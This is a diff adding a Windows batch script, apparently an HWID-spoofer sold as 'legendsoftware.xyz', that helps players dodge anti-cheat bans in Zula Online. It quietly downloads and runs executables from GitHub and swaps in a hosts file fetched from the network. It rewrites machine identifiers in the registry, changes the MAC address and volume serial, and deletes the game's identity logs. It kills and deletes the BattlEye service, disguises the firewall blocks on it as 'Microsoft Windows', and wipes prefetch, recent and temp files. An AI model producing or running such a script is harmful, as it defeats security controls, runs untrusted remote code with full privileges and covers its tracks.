@@ -1,0 +1,342 @@
+��&cls
+@echo off
+echo off
+
+CHCP 65001 > NUL
+
+Title Please wait!
+echo Please wait!
+cls
+
+title legendsoftware.xyz
+
+
+cd %windir%
+
+
+if exist "%windir%\tmacsetup.exe" (
+    goto SKIP_DOWNLOAD
+)
+
+
+powershell -NoProfile -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object System.Net.WebClient).DownloadFile('https://github.com/pofonya-dotcom/tmac/raw/refs/heads/main/tmac.exe','tmacsetup.exe')" >nul 2>&1
+pwsh -NoProfile -Command "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://github.com/pofonya-dotcom/tmac/raw/refs/heads/main/tmac.exe' -OutFile 'tmacsetup.exe'" >nul 2>&1
+powershell -NoProfile -Command "[System.Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://github.com/pofonya-dotcom/tmac/raw/refs/heads/main/tmac.exe' -OutFile 'tmacsetup.exe'" >nul 2>&1
+
+:SKIP_DOWNLOAD
+
+tmacsetup.exe /default >nul 2>&1
+
+cls
+
+cd "%ProgramFiles(x86)%\Technitium\TMACv6.0"
+
+powershell -NoProfile -ExecutionPolicy Bypass -Command "Get-NetAdapter -Physical | ForEach-Object { $n = $_.Name; Write-Host 'Applying to:' $n; Start-Process -FilePath '%ProgramFiles(x86)%\Technitium\TMACv6.0\tmac.exe' -ArgumentList ('-n', $n, '-r02', '-re', '-s') -Wait }" >nul 2>&1
+taskkill /f /im tmac.exe
+cls
+
+
+cd "%systemdrive%\Zula" >nul 2>&1
+"del acklog.txt" >nul 2>&1
+DEL /F /Q /A acklog.txt >nul 2>&1
+CMD /c Echo Y| RD /S /Q log >nul 2>&1
+CMD /c Echo Y| RD /S /Q logs >nul 2>&1
+CMD /c Echo E| RD /S /Q log >nul 2>&1
+CMD /c Echo E| RD /S /Q logs >nul 2>&1
+CMD /c Echo E| RD /S /Q log >nul 2>&1
+CMD /c Echo E| RD /S /Q logs >nul 2>&1
+CMD /c Echo E| del log >nul 2>&1
+CMD /c Echo E| del logs >nul 2>&1
+
+
+cd "%systemdrive%\Zula\Game" >nul 2>&1
+DEL /F /Q /A "acklog.txt" >nul 2>&1
+DEL /F /Q /A "ceflog.txt" >nul 2>&1
+DEL /F /Q /A "idenity.txt" >nul 2>&1
+DEL /F /Q /A "ýdenity.txt" >nul 2>&1
+DEL /F /Q /A "ýdenýty.txt" >nul 2>&1
+DEL /F /Q /A "idenýty.txt" >nul 2>&1
+DEL /F /Q /A "exit.log" >nul 2>&1
+DEL /F /Q /A LogAnzu.txt" >nul 2>&1
+DEL /F /Q /A "imgui.ini" >nul 2>&1
+DEL /F /Q /A "cdimgui.ini" >nul 2>&1
+DEL /F /Q /A "logcef.txt" >nul 2>&1
+CMD /c Echo Y| RD /S /Q log >nul 2>&1
+CMD /c Echo Y| RD /S /Q logs >nul 2>&1
+CMD /c Echo Y| del log >nul 2>&1
+CMD /c Echo Y| del logs >nul 2>&1
+CMD /c Echo E| RD /S /Q log >nul 2>&1
+CMD /c Echo E| RD /S /Q logs >nul 2>&1
+CMD /c Echo E| del log >nul 2>&1
+CMD /c Echo E| del logs >nul 2>&1
+cls
+cd "%ProgramFiles(x86)%\Steam\steamapps\common\Zula Online" >nul 2>&1
+"del acklog.txt" >nul 2>&1
+DEL /F /Q /A acklog.txt >nul 2>&1
+CMD /c Echo Y| RD /S /Q log >nul 2>&1
+CMD /c Echo Y| RD /S /Q logs >nul 2>&1
+CMD /c Echo E| RD /S /Q log >nul 2>&1
+CMD /c Echo E| RD /S /Q logs >nul 2>&1
+CMD /c Echo E| RD /S /Q log >nul 2>&1
+CMD /c Echo E| RD /S /Q logs >nul 2>&1
+CMD /c Echo E| del log >nul 2>&1
+CMD /c Echo E| del logs >nul 2>&1
+
+cd "%ProgramFiles(x86)%\Steam\steamapps\common\Zula Online\Game" >nul 2>&1
+DEL /F /Q /A "acklog.txt" >nul 2>&1
+DEL /F /Q /A "ceflog.txt" >nul 2>&1
+DEL /F /Q /A "idenity.txt" >nul 2>&1
+DEL /F /Q /A "ýdenity.txt" >nul 2>&1
+DEL /F /Q /A "ýdenýty.txt" >nul 2>&1
+DEL /F /Q /A "idenýty.txt" >nul 2>&1
+DEL /F /Q /A "exit.log" >nul 2>&1
+DEL /F /Q /A LogAnzu.txt" >nul 2>&1
+DEL /F /Q /A "imgui.ini" >nul 2>&1
+DEL /F /Q /A "cdimgui.ini" >nul 2>&1
+DEL /F /Q /A "logcef.txt" >nul 2>&1
+CMD /c Echo Y| RD /S /Q log >nul 2>&1
+CMD /c Echo Y| RD /S /Q logs >nul 2>&1
+CMD /c Echo Y| del log >nul 2>&1
+CMD /c Echo Y| del logs >nul 2>&1
+CMD /c Echo E| RD /S /Q log >nul 2>&1
+CMD /c Echo E| RD /S /Q logs >nul 2>&1
+CMD /c Echo E| del log >nul 2>&1
+CMD /c Echo E| del logs >nul 2>&1
+cls
+
+setlocal
+
+
+for /f %%G in ('powershell -Command "[guid]::NewGuid().ToString('B')"') do set NEW_GUID=%%G
+
+
+REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\IDConfigDB\Hardware Profiles\0001" /v HwProfileGuid /t REG_SZ /d %NEW_GUID% /f >nul 2>&1
+
+cls
+
+
+setlocal enabledelayedexpansion
+
+
+set "chars=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
+
+
+set "blockCount=4"
+set "blockLen=5"
+
+:MakeRandomID
+set "newid="
+for /L %%B in (1,1,%blockCount%) do (
+    set "block="
+    for /L %%C in (1,1,%blockLen%) do (
+        set /a "rnd=!random! %% 52"
+        for %%D in (!rnd!) do set "block=!block!!chars:~%%D,1!"
+    )
+    if %%B lss %blockCount% (
+        set "newid=!newid!!block!-"
+    ) else (
+        set "newid=!newid!!block!"
+    )
+)
+
+
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v ProductId /t REG_SZ /d "%newid%" /f >nul 2>&1
+cls
+
+setlocal ENABLEEXTENSIONS
+
+
+
+
+for /f %%i in ('powershell -Command "[guid]::NewGuid().ToString()"') do set NEWGUID=%%i >nul 2>&1
+
+
+
+
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography" /v MachineGuid /t REG_SZ /d %NEWGUID% /f >nul 2>&1
+
+cls
+
+set "charset=ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+set "randomPart="
+
+
+for /l %%i in (1,1,7) do (
+    set /a index=!random! %% 36
+    call set "char=%%charset:~!index!,1%%"
+    set "randomPart=!randomPart!!char!"
+)
+
+
+set "newName=DESKTOP-!randomPart!"
+
+
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName" /v ComputerName /t REG_SZ /d !newName! /f >nul 2>&1
+
+cls
+
+
+setlocal EnableDelayedExpansion
+set "charset=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
+set "randStr="
+for /L %%i in (1,1,16) do (
+    set /A index=!random! %% 62
+    for %%j in (!index!) do set "randStr=!randStr!!charset:~%%j,1!"
+)
+
+
+reg add "HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\CentralProcessor\0" /v "ProcessorNameString" /t REG_SZ /d "!randStr!" /f >nul 2>&1
+
+
+cls
+
+
+cd "%windir%\System32\drivers\etc" >nul 2>&1
+
+attrib -a -h -i -r -s -x hosts >nul 2>&1
+attrib -a -h -i -r -s -x hosts.ics >nul 2>&1
+
+DEL /F /Q /A hosts >nul 2>&1
+DEL /F /Q /A hosts.ics >nul 2>&1
+
+DEL /F /S /Q /A hosts >nul 2>&1
+DEL /F /S /Q /A hosts.ics >nul 2>&1
+
+powershell -NoProfile -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/hasanbasn5/--ne--ne-hasan4504/main/hosts','hosts')" >nul 2>&1
+pwsh -NoProfile -Command "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/hasanbasn5/--ne--ne-hasan4504/main/hosts' -OutFile 'hosts'" >nul 2>&1
+powershell -NoProfile -Command "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/hasanbasn5/--ne--ne-hasan4504/main/hosts' -OutFile 'hosts'" >nul 2>&1
+
+powershell -NoProfile -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/hasanbasn5/--ne--ne-hasan4504/main/hosts.ics','hosts.ics')" >nul 2>&1
+pwsh -NoProfile -Command "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/hasanbasn5/--ne--ne-hasan4504/main/hosts.ics' -OutFile 'hosts.ics'" >nul 2>&1
+powershell -NoProfile -Command "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/hasanbasn5/--ne--ne-hasan4504/main/hosts.ics' -OutFile 'hosts.ics'" >nul 2>&1
+
+ipconfig/flushdns >nul 2>&1
+ipconfig/registerdns >nul 2>&1
+
+attrib +h +s +r hosts >nul 2>&1
+attrib +h +s +r hosts.ics >nul 2>&1
+
+cls
+
+
+
+netsh int ip delete destinationcache >nul 2>&1
+netsh interface ip delete arpcache >nul 2>&1
+netsh winhttp reset proxy >nul 2>&1
+taskkill /f /im BEService.exe >nul 2>&1
+net stop BEService >nul 2>&1
+sc delete BEService >nul 2>&1
+netsh advfirewall reset >nul 2>&1
+ipconfig/flushdns >nul 2>&1
+netsh int ip reset >nul 2>&1
+netsh int ip reset all >nul 2>&1
+netsh WinHTTP Reset proxy >nul 2>&1
+netsh interface ipv6 reset >nul 2>&1
+netsh interface ipv4 reset >nul 2>&1
+ipconfig/registerdns >nul 2>&1
+netsh winsock reset >nul 2>&1
+netsh winsock reset catalog >nul 2>&1
+ipconfig/registerdns >nul 2>&1
+ipconfig/displaydns >nul 2>&1
+ipconfig/release >nul 2>&1
+ipconfig/renew >nul 2>&1
+ipconfig/release6 >nul 2>&1  
+ipconfig/renew6 >nul 2>&1
+ipconfig/flushdns >nul 2>&1
+nbtstat -r >nul 2>&1
+nbtstat -rr >nul 2>&1
+arp -d * >nul 2>&1
+
+
+
+
+
+
+netsh advfirewall firewall add rule name="Microsoft Windows" dir=in action=block program="%ProgramFiles(x86)%\Common Files\BattlEye\BEService.exe" enable=yes >nul 2>&1
+netsh advfirewall firewall add rule name="Microsoft Windows" dir=out action=block program="%ProgramFiles(x86)%\Common Files\BattlEye\BEService.exe" enable=yes >nul 2>&1
+
+
+netsh advfirewall firewall add rule name="Microsoft Windows" dir=in action=block program="%ProgramFiles(x86)%\Common Files\BattlEye\BEService.exe" enable=yes profile=any interfacetype=any >nul 2>&1
+netsh advfirewall firewall add rule name="Microsoft Windows" dir=out action=block program="%ProgramFiles(x86)%\Common Files\BattlEye\BEService.exe" enable=yes profile=any interfacetype=any >nul 2>&1
+
+
+
+
+
+
+
+
+netsh advfirewall firewall add rule name="Microsoft Windows" protocol=TCP dir=out localport=27004 action=block >nul 2>&1
+netsh advfirewall firewall add rule name="Microsoft Windows" protocol=UDP dir=out localport=27004 action=block >nul 2>&1
+netsh advfirewall firewall add rule name="Microsoft Windows" protocol=TCP dir=in localport=27004 action=block >nul 2>&1
+netsh advfirewall firewall add rule name="Microsoft Windows" protocol=UDP dir=in localport=27004 action=block >nul 2>&1
+
+
+netsh advfirewall firewall add rule name="Microsoft Windows" protocol=TCP dir=out remoteport=27004 action=block >nul 2>&1
+netsh advfirewall firewall add rule name="Microsoft Windows" protocol=UDP dir=out remoteport=27004 action=block >nul 2>&1
+netsh advfirewall firewall add rule name="Microsoft Windows" protocol=TCP dir=in remoteport=27004 action=block >nul 2>&1
+netsh advfirewall firewall add rule name="Microsoft Windows" protocol=UDP dir=in remoteport=27004 action=block >nul 2>&1
+
+
+
+
+netsh advfirewall set allprofiles state on >nul 2>&1
+cls
+
+
+cd %windir%\
+powershell -NoProfile -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object System.Net.WebClient).DownloadFile('https://github.com/williamreport/bat/raw/refs/heads/main/Volumeid.exe','volumeid.exe')" >nul 2>&1
+pwsh -NoProfile -Command "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://github.com/williamreport/bat/raw/refs/heads/main/Volumeid.exe' -OutFile 'volumeid.exe'" >nul 2>&1
+powershell -NoProfile -Command "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://github.com/williamreport/bat/raw/refs/heads/main/Volumeid.exe' -OutFile 'volumeid.exe'" >nul 2>&1
+attrib +h +s +r volumeid.exe >nul 2>&1
+setlocal EnableDelayedExpansion
+
+
+set "hexchars=0123456789ABCDEF"
+
+
+set "part1="
+for /L %%i in (1,1,4) do (
+    set /A index=!random! %% 16
+    for %%j in (!index!) do set "part1=!part1!!hexchars:~%%j,1!"
+)
+
+
+set "part2="
+for /L %%i in (1,1,4) do (
+    set /A index=!random! %% 16
+    for %%j in (!index!) do set "part2=!part2!!hexchars:~%%j,1!"
+)
+
+
+volumeid /accepteula %SystemDrive% !part1!-!part2! >nul 2>&1
+volumeid /accepteula %homedrive% !part1!-!part2! >nul 2>&1
+
+attrib -h -s -r volumeid.exe  >nul 2>&1
+DEL /F /S /Q /A volumeid.exe >nul 2>&1
+DEL /F /Q /A volumeid.exe >nul 2>&1
+
+cls
+
+del /f /s /q %windir%\prefetch\*.* >nul 2>&1
+del /f /q %userprofile%\cookies\*.* >nul 2>&1
+del /f /q %userprofile%\recent\*.* >nul 2>&1
+del /f /q %userprofile%\temp\*.* >nul 2>&1
+del /f /s /q "%userprofile%\Local Settings\Temporary Internet Files\*.*" >nul 2>&1
+del /f /q "%userprofile%\AppData\Local\Microsoft\Windows\Temporary Internet Files\*.*" >nul 2>&1
+del /f /s /q "%userprofile%\Local Settings\Temp\*.*" >nul 2>&1
+del /f /s /q "%userprofile%\recent\*.*" >nul 2>&1
+del /s /q %windir%\temp\* >nul 2>&1
+del /f /s /q "%userprofile%\recent\*.*" >nul 2>&1
+del /q /f /s "%USERPROFILE%\AppData\Local\Temp\*.*" >nul 2>&1
+rd /s /q %windir%\temp >nul 2>&1 & md %windir%\temp >nul 2>&1
+del /q/f/s %TEMP%\* >nul 2>&1
+rd /s /q %windir%\temp >nul 2>&1
+del /f /q %username%\temp\*.* >nul 2>&1
+del /s /f /q "%windir%\Temp\*.*" >nul 2>&1
+del /s /f /q %temp%\*.* >nul 2>&1
+del /q /f /s "%USERPROFILE%\AppData\Local\Temp\*.*" >nul 2>&1
+CLEANMGR /sagerun: >nul 2>&1
+
+
+exit
